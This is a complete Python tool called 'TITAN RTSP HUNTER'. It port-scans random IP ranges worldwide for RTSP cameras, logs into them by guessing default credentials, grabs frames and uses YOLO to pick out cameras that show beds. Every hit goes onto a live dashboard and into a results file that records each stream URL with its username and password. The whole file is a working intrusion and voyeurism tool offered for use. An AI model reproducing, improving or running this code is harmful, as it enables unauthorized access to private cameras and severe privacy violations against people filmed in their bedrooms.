#!/usr/bin/env python3
"""
TITAN RTSP HUNTER — Ultra-Fast RTSP-Only Live Camera Scanner
Strategy:
  1. Port-scan thousands of IPs per second on RTSP ports (554, 8554, 37777)
  2. For each live host, use ffprobe to rapidly check a list of common RTSP paths.
  3. If ffprobe finds a valid stream, use ffmpeg to capture one frame.
  4. Run YOLO on the captured frame to detect beds.
  5. Build a live streaming HTML dashboard that auto-refreshes.
"""

import asyncio
import base64
import ipaddress
import json
import os
import random
import re
import socket
import struct
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path

# ── paths ─────────────────────────────────────────────────
BASE = Path(__file__).resolve().parent
FRAMES = BASE / "hunt_frames"
RESULTS = BASE / "results"
YOLO_MODEL = BASE.parent / "yolov8n.pt"
FRAMES.mkdir(exist_ok=True)
RESULTS.mkdir(exist_ok=True)

sys.path.insert(0, str(BASE))
from cctv_config import GLOBAL_CIDRS, RTSP_PATHS, CREDENTIALS, YOLO_CLASSES

# ══════════════════════════════════════════════════════════
# GLOBALS
# ══════════════════════════════════════════════════════════
FOUND_CAMS = []
BED_CAMS = []
LOCK = threading.Lock()
TARGET = 100
STATS = {
    "ips_tried": 0, "ports_open": 0, "rtsp_hit": 0,
    "frames_ok": 0, "yolo_ok": 0, "beds": 0,
    "status": "idle"
}

# ══════════════════════════════════════════════════════════
# IP GENERATOR
# ══════════════════════════════════════════════════════════

def ip_stream(cidrs: list, batch: int = 20000):
    nets = [ipaddress.ip_network(c, strict=False) for c in cidrs if '/' in c]
    weights = [n.num_addresses for n in nets]
    while True:
        ips = set()
        while len(ips) < batch:
            net = random.choices(nets, weights=weights, k=1)[0]
            if net.num_addresses > 2:
                off = random.randint(1, net.num_addresses - 2)
                ip = str(net.network_address + off)
                if not (ip.endswith(".0") or ip.endswith(".255")):
                    ips.add(ip)
        lst = list(ips)
        random.shuffle(lst)
        yield from lst

# ══════════════════════════════════════════════════════════
# ASYNC PORT SCANNER
# ══════════════════════════════════════════════════════════

async def _check_port_async(ip: str, port: int, sem: asyncio.Semaphore, timeout: float = 1.0):
    async with sem:
        try:
            _, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=timeout)
            writer.close()
            await writer.wait_closed()
            return (ip, port, True)
        except Exception:
            return (ip, port, False)

async def scan_ips_async(ips: list, ports: list, concurrency: int = 2000, timeout: float = 0.8):
    sem = asyncio.Semaphore(concurrency)
    tasks = [_check_port_async(ip, p, sem, timeout) for ip in ips for p in ports]
    hits = []
    for coro in asyncio.as_completed(tasks):
        ip, port, ok = await coro
        if ok:
            hits.append((ip, port))
    return hits

def port_scan(ips: list, ports: list, concurrency: int = 1500) -> list:
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(scan_ips_async(ips, ports, concurrency))
    finally:
        loop.close()

# ══════════════════════════════════════════════════════════
# RTSP PROBE (ffprobe + ffmpeg)
# ══════════════════════════════════════════════════════════

RTSP_COMMON_PATHS = [
    "/Streaming/Channels/101", "/cam/realmonitor?channel=1&subtype=0", "/stream1",
    "/h264/ch1/main/av_stream", "/live", "/0", "/", "/onvif1",
    "/video.sdp", "/live.sdp", "/1", "/ch01/0", "/ucast/11",
]

def probe_rtsp_host(ip: str, port: int, probe_timeout: int = 3, frame_timeout: int = 5) -> dict | None:
    """Use ffprobe to find a valid stream, then ffmpeg to capture a frame."""
    combos = []
    for user, pwd in CREDENTIALS[:10]:
        for path in RTSP_COMMON_PATHS:
            auth = f"{user}:{pwd}@" if user or pwd else ""
            combos.append((f"rtsp://{auth}{ip}:{port}{path}", user, pwd, path))
    random.shuffle(combos)

    def _try_ffprobe(rtsp_url):
        try:
            proc = subprocess.run(
                ["ffprobe", "-v", "quiet", "-rtsp_transport", "tcp", "-stimeout", str(probe_timeout * 1000000), rtsp_url],
                capture_output=True, text=True, timeout=probe_timeout + 1
            )
            return proc.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False

    with ThreadPoolExecutor(max_workers=8) as pool:
        futs = {pool.submit(_try_ffprobe, url): (url, user, pwd, path) for url, user, pwd, path in combos}
        for fut in as_completed(futs):
            is_valid = fut.result()
            if is_valid:
                rtsp_url, user, pwd, path = futs[fut]
                # Found a valid stream, now capture frame
                safe_ip = ip.replace(".", "_")
                frame_path = str(FRAMES / f"bed_{safe_ip}_{port}.jpg")
                try:
                    r = subprocess.run(
                        ["ffmpeg", "-y", "-rtsp_transport", "tcp", "-stimeout", str(frame_timeout * 1000000),
                         "-i", rtsp_url, "-vframes", "1", "-vf", "scale=640:-1",
                         "-f", "image2", frame_path],
                        capture_output=True, timeout=frame_timeout, text=True,
                    )
                    if r.returncode == 0 and os.path.isfile(frame_path) and os.path.getsize(frame_path) > 3000:
                        with open(frame_path, "rb") as fh:
                            if fh.read(3) == b"\xff\xd8\xff":
                                res = re.search(r"(\d{2,5})x(\d{2,5})", r.stderr)
                                reso = f"{res.group(1)}x{res.group(2)}" if res else "?"
                                return {
                                    "ip": ip, "port": port, "rtsp_url": rtsp_url,
                                    "user": user, "password": pwd, "rtsp_path": path,
                                    "frame_file": frame_path, "frame_size": os.path.getsize(frame_path),
                                    "resolution": reso, "type": "rtsp", "timestamp": datetime.now().isoformat(),
                                }
                except (subprocess.TimeoutExpired, FileNotFoundError):
                    pass
                # Since we found a valid stream, stop trying others for this host
                for f in futs: f.cancel()
                return None # Return None if frame grab fails
    return None

# ══════════════════════════════════════════════════════════
# YOLO
# ══════════════════════════════════════════════════════════

_yolo_model = None
_yolo_lock = threading.Lock()

def get_yolo():
    global _yolo_model
    if _yolo_model is None:
        with _yolo_lock:
            if _yolo_model is None:
                from ultralytics import YOLO
                mp = str(YOLO_MODEL) if YOLO_MODEL.exists() else "yolov8n.pt"
                _yolo_model = YOLO(mp)
    return _yolo_model

def yolo_has_bed(frame_path: str, conf: float = 0.25) -> dict:
    if not os.path.isfile(frame_path):
        return {"has_bed": False, "bed_conf": 0, "objects": []}
    try:
        m = get_yolo()
        results = m(frame_path, conf=conf, verbose=False)
        labels, bed_conf = [], 0.0
        for r in results:
            for box in r.boxes:
                cls = int(box.cls[0])
                label = YOLO_CLASSES.get(cls, f"cls{cls}")
                c = float(box.conf[0])
                labels.append(label)
                if cls == 59: bed_conf = max(bed_conf, c)
        return {"has_bed": bed_conf > 0, "bed_conf": round(bed_conf, 3), "objects": list(set(labels))}
    except Exception as e:
        return {"has_bed": False, "bed_conf": 0, "objects": [], "err": str(e)}

def frame_to_b64(path: str) -> str:
    try:
        with open(path, "rb") as f: return base64.b64encode(f.read()).decode()
    except Exception: return ""

# ══════════════════════════════════════════════════════════
# MAIN HUNTING LOOP
# ══════════════════════════════════════════════════════════

def hunt_loop(all_cidrs: list, probe_workers: int = 80, batch_size: int = 15000):
    STATS["status"] = "scanning"
    gen = ip_stream(all_cidrs, batch=batch_size)
    round_num = 0

    while len(BED_CAMS) < TARGET:
        round_num += 1
        ips = [next(gen) for _ in range(batch_size)]
        STATS["ips_tried"] += len(ips)
        print(f"\n[ROUND {round_num}] Port scanning {len(ips):,} IPs on RTSP ports | beds={len(BED_CAMS)}/{TARGET}")

        hits = port_scan(ips, ports=[554, 8554, 37777], concurrency=2000)
        if not hits:
            print(f"  → 0 open ports, next batch")
            continue

        STATS["ports_open"] += len(hits)
        print(f"  → {len(hits)} open RTSP ports found. Probing...")

        with ThreadPoolExecutor(max_workers=probe_workers) as pool:
            futs = {pool.submit(probe_rtsp_host, ip, port): (ip, port) for ip, port in hits}
            for fut in as_completed(futs):
                if len(BED_CAMS) >= TARGET:
                    for f in futs: f.cancel()
                    break
                ip, port = futs[fut]
                try:
                    cam = fut.result()
                    if cam is None: continue

                    STATS["rtsp_hit"] += 1
                    STATS["frames_ok"] += 1
                    yolo = yolo_has_bed(cam["frame_file"])
                    cam["yolo"] = yolo
                    STATS["yolo_ok"] += 1
                    cam["frame_b64"] = frame_to_b64(cam["frame_file"])

                    with LOCK: FOUND_CAMS.append(cam)

                    if yolo["has_bed"]:
                        STATS["beds"] += 1
                        with LOCK: BED_CAMS.append(cam)
                        print(f"  🛏  BED #{len(BED_CAMS):>3}  {ip:>15}:{port:<5}  conf={yolo['bed_conf']:.2f}  objs={yolo['objects']}")
                    else:
                        print(f"  📷  CAM      {ip:>15}:{port:<5}  objs={yolo['objects']}")

                    if len(BED_CAMS) > 0 and len(BED_CAMS) % 5 == 0:
                        save_results()
                        regen_dashboard()
                except Exception: pass

        if len(BED_CAMS) >= TARGET: break

    STATS["status"] = "complete"
    save_results()
    regen_dashboard()
    print(f"\n{'='*60}\n  COMPLETE — {len(BED_CAMS)} bed cameras found\n{'='*60}")

# ══════════════════════════════════════════════════════════
# DASHBOARD & RESULTS
# ══════════════════════════════════════════════════════════

DASHBOARD_PATH = BASE / "bed_stream.html"

def regen_dashboard():
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    cam_cards = ""
    for i, c in enumerate(BED_CAMS):
        b64 = c.get("frame_b64", "")
        img = f'<img src="data:image/jpeg;base64,{b64}" style="width:100%;border-radius:6px;">' if b64 else '<div style="height:200px;background:#222;border-radius:6px;display:flex;align-items:center;justify-content:center;color:#555;">No frame</div>'
        yolo = c.get("yolo", {})
        cam_cards += f'''
        <div style="background:#1a1a2e;border:1px solid #333;border-radius:8px;padding:12px;margin:8px;width:300px;">
            <div style="color:#0f0;font-weight:bold;">BED #{i+1} — {c["ip"]}:{c["port"]}</div>
            {img}
            <div style="font-size:12px;color:#aaa;margin-top:6px;">
                Resolution: {c.get("resolution","?")} | Conf: {yolo.get("bed_conf",0):.2f}<br>
                Path: {c.get("rtsp_path","?")}<br>
                Objects: {', '.join(yolo.get("objects",[]))}<br>
                RTSP: <code style="color:#0ff;font-size:10px;word-break:break-all;">{c.get("rtsp_url","")}</code>
            </div>
        </div>'''

    all_cards = ""
    for c in FOUND_CAMS[-50:]:
        b64 = c.get("frame_b64", "")
        img = f'<img src="data:image/jpeg;base64,{b64}" style="width:100%;border-radius:6px;">' if b64 else ''
        yolo = c.get("yolo", {})
        border = "#0f0" if yolo.get("has_bed") else "#444"
        all_cards += f'''
        <div style="background:#1a1a2e;border:1px solid {border};border-radius:8px;padding:10px;margin:6px;width:220px;">
            <div style="color:#ccc;font-size:11px;">{c["ip"]}:{c["port"]}</div>
            {img}
            <div style="font-size:10px;color:#888;margin-top:4px;">Objects: {', '.join(yolo.get("objects",[]))}</div>
        </div>'''

    html = f'''<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>TITAN RTSP Hunter — Live</title>
<meta http-equiv="refresh" content="15">
<style>body{{background:#0d0d1a;color:#eee;font-family:monospace;margin:0;padding:20px;}}
code{{background:#000;padding:2px 4px;border-radius:3px;}}</style></head>
<body>
<h1 style="color:#f00;">TITAN RTSP HUNTER — LIVE DASHBOARD</h1>
<div style="background:#111;padding:12px;border-radius:8px;margin-bottom:20px;">
  <b>Status:</b> {STATS["status"]} | <b>IPs Scanned:</b> {STATS["ips_tried"]:,} |
  <b>Open Ports:</b> {STATS["ports_open"]:,} | <b>RTSP Hits:</b> {STATS["rtsp_hit"]:,} |
  <b>Frames:</b> {STATS["frames_ok"]:,} | <b>YOLO Runs:</b> {STATS["yolo_ok"]:,} |
  <b style="color:#0f0;">Beds Found: {STATS["beds"]:,} / {TARGET}</b> |
  <b>Updated:</b> {ts}
</div>
<h2 style="color:#0f0;">Bed Cameras ({len(BED_CAMS)})</h2>
<div style="display:flex;flex-wrap:wrap;">{cam_cards}</div>
<h2 style="color:#888;">All Captures (last 50)</h2>
<div style="display:flex;flex-wrap:wrap;">{all_cards}</div>
</body></html>'''
    DASHBOARD_PATH.write_text(html)
    print(f"  [DASH] Updated {DASHBOARD_PATH} — {len(BED_CAMS)} beds, {len(FOUND_CAMS)} total")

def save_results():
    out = {
        "timestamp": datetime.now().isoformat(),
        "stats": STATS,
        "bed_cams": [{k: c.get(k) for k in ["ip", "port", "rtsp_url", "user", "password", "resolution", "yolo"]} for c in BED_CAMS],
    }
    with open(RESULTS / "bed_cams_live.json", "w") as f:
        json.dump(out, f, indent=2, default=str)

# ══════════════════════════════════════════════════════════
# HTTP SERVER
# ══════════════════════════════════════════════════════════

class DashHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/api/stats":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            data = {"stats": STATS, "beds": len(BED_CAMS), "total": len(FOUND_CAMS)}
            self.wfile.write(json.dumps(data).encode())
        elif DASHBOARD_PATH.exists():
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(DASHBOARD_PATH.read_bytes())
        else:
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<html><body style='background:#000;color:#0f0;font-family:monospace;padding:40px;'><h1>TITAN RTSP HUNTER</h1><p>Scanning in progress... Refresh in a few seconds.</p></body></html>")
    def log_message(self, fmt, *args):
        pass  # suppress access logs

def serve(port: int = 7701):
    server = HTTPServer(('0.0.0.0', port), DashHandler)
    print(f"[HTTP] Dashboard: http://localhost:{port}")
    server.serve_forever()

# ══════════════════════════════════════════════════════════
# ENTRY POINT
# ══════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--target", type=int, default=100)
    p.add_argument("--port", type=int, default=7701)
    p.add_argument("--workers", type=int, default=80)
    p.add_argument("--batch", type=int, default=15000)
    args = p.parse_args()

    TARGET = args.target
    all_cidrs = [cidr for country_cidrs in GLOBAL_CIDRS.values() for cidr in country_cidrs]
    print(f"[INIT] {len(all_cidrs)} CIDRs across {len(GLOBAL_CIDRS)} countries")

    print("[INIT] Loading YOLOv8...")
    get_yolo()
    print("[INIT] YOLO ready")

    regen_dashboard()

    # Start HTTP server in background thread
    srv_thread = threading.Thread(target=serve, args=(args.port,), daemon=True)
    srv_thread.start()

    print(f"\n{'='*60}")
    print(f"  TITAN RTSP HUNTER — Worldwide Scan")
    print(f"  Target: {TARGET} bed cameras | Workers: {args.workers} | Batch: {args.batch} IPs")
    print(f"  Dashboard: http://localhost:{args.port}")
    print(f"{'='*60}\n")

    try:
        hunt_loop(all_cidrs, probe_workers=args.workers, batch_size=args.batch)
    except KeyboardInterrupt:
        print(f"\nStopped. {len(BED_CAMS)} bed cams found.")
    finally:
        save_results()
        regen_dashboard()
        print("Results saved.")
